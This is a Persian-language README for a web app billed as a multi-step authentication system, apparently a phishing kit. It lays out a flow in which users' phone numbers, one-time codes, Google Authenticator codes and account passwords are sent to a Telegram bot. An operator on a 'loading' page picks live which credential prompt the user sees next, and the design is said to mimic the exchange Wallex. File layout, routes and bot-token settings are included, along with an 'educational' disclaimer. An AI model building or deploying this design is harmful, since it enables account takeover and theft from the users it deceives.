# 🔐 سیستم احراز هویت چندمرحله‌ای

## 📋 جریان کاربری

### مرحله ۱: ورود شماره همراه

1. کاربر شماره همراه وارد می‌کند
2. شماره به بات تلگرام ارسال می‌شود
3. کد تایید ۶ رقمی تولید و به تلگرام ارسال می‌شود
4. کاربر به صفحه تایید هدایت می‌شود

### مرحله ۲: تایید شماره همراه

1. کاربر کد ۶ رقمی وارد می‌کند
2. کد با مقدار ذخیره شده مقایسه می‌شود
3. در صورت موفقیت، اطلاع به تلگرام ارسال می‌شود
4. کاربر به صفحه لودینگ هدایت می‌شود

### مرحله ۳: کنترل ادمین (صفحه لودینگ)

پس از ۳ ثانیه، دکمه‌های کنترل ادمین نمایش داده می‌شود:

#### 🟢 دکمه‌های دسترس:

- **📧 Email Code**: تایید کد ایمیل
- **📱 Google Auth**: Google Authenticator
- **💬 SMS Code**: کد پیامک اضافی
- **🔒 Password**: تایید رمز عبور

#### 🎯 عملکرد ادمین:

- ادمین یکی از دکمه‌ها را انتخاب می‌کند
- کاربر به صفحه احراز هویت مربوطه هدایت می‌شود
- پس از تکمیل هر مرحله، دوباره به صفحه لودینگ برمی‌گردد
- ادمین می‌تواند مراحل بیشتری اضافه کند

### مرحله ۴: مراحل احراز هویت

#### 📧 **Email Code**

- کاربر ایمیل وارد می‌کند
- کد ۶ رقمی تولید و نمایش داده می‌شود (حالت دمو)
- کاربر کد را وارد می‌کند
- برگشت به صفحه لودینگ

#### 📱 **Google Auth**

- نمایش QR Code برای راه‌اندازی
- راهنمای استفاده از Google Authenticator
- ورود کد ۶ رقمی
- برگشت به صفحه لودینگ

#### 💬 **SMS Code**

- کد ۶ رقمی تولید و نمایش داده می‌شود (حالت دمو)
- تایمر ۵۴ ثانیه برای ارسال مجدد
- ورود کد تایید
- برگشت به صفحه لودینگ

#### 🔒 **Password**

- ورود رمز عبور حساب کاربری
- اعتبارسنجی قوت رمز عبور
- لینک فراموشی رمز عبور
- برگشت به صفحه لودینگ

### مرحله ۵: تکمیل احراز هویت

- ادمین دکمه "تکمیل احراز هویت" را می‌زند
- اطلاعات در localStorage ذخیره می‌شود
- کاربر به صفحه اصلی هدایت می‌شود

## 🛠️ ساختار فایل‌ها

### 📁 صفحات اصلی:

```
src/pages/
├── Index.tsx              # صفحه اصلی با فرم شماره
├── PhoneVerification.tsx  # تایید کد شماره همراه
├── Loading.tsx            # صفحه لودینگ + کنترل ادمین
├── AuthEmail.tsx          # احراز هویت ایمیل
├── AuthGoogle.tsx         # Google Authenticator
├── AuthSMS.tsx           # کد پیامک
├── AuthPassword.tsx      # تایید رمز عبور
└── NotFound.tsx          # صفحه ۴۰۴
```

### 📁 سرویس‌ها:

```
src/lib/
├── telegram-service.ts   # ارتباط با API تلگرام
├── persian-utils.ts      # تبدیل اعداد فارسی/انگلیسی
└── utils.ts             # ابزارهای کمکی
```

### 📁 کامپوننت‌ها:

```
src/components/
├── LoginForm.tsx        # فرم ورود شماره همراه
├── OTPInput.tsx        # ورودی کد ۶ رقمی
├── AlertMessage.tsx    # پیام‌های هشدار
└── ui/                # کامپوننت‌های UI
```

## 🚀 مسیرهای سیستم

```javascript
// مسیرهای تعریف شده
/                    # صفحه اصلی
/verify-phone        # تایید شماره همراه
/loading            # لودینگ + کنترل ادمین
/auth-email         # احراز هویت ایمیل
/auth-google        # Google Authenticator
/auth-sms          # کد پیامک
/auth-password     # تایید رمز عبور
```

## 💡 ویژگی‌های خاص

### 🎭 حالت دمو

- بدون نیاز به تنظیمات تلگرام کار می‌کند
- کدهای تایید در alert نمایش داده می‌شوند
- تمام فرآیند قابل تست است

### 🔔 ادغام تلگرام

- ارسال اطلاعات کاربر به بات
- ارسال کدهای تایید
- اطلاع‌رسانی مراحل تکمیل شده

### 📱 طراحی ریسپانسیو

- سازگار با موبایل و دسکتاپ
- طراحی مشابه والکس
- انیمیشن‌های نرم

### 🛡️ امنیت

- اعتبارسنجی ورودی‌ها
- ذخیره موقت کدها در sessionStorage
- مدیریت خطاهای امن

## 🧪 نحوه تست

### 1. **شماره همراه**

```
09123456789  # شماره معتبر ایرانی
```

### 2. **کدهای تایید**

```
# کدها در alert نمایش داده می‌شوند
# یا در کنسول مرورگر قابل مشاهده‌اند
```

### 3. **ایمیل نمونه**

```
test@example.com  # ایمیل معتبر
```

### 4. **رمز عبور نمونه**

```
Password123  # حداقل ۸ کاراکتر + حروف + اعداد
```

## 🔧 تنظیمات تلگرام

برای فعال‌سازی ارسال واقعی به تلگرام:

```env
# .env
VITE_TELEGRAM_BOT_TOKEN=your_bot_token
VITE_TELEGRAM_CHAT_ID=your_chat_id
```

## 📞 پشتیبانی

در صورت بروز مشکل:

1. کنسول مرورگر را بررسی کنید
2. مطمئن شوید JavaScript فعال است
3. از مرورگر به‌روز استفاده کنید
4. فایل‌های کش را پاک کنید

---

**نکته**: این سیستم برای مقاص�� آموزشی و نمایشی طراحی شده است. برای استفاده در محیط تولید، لطفاً امنیت و اعتبارسنجی سمت سرور را اضافه کنید.
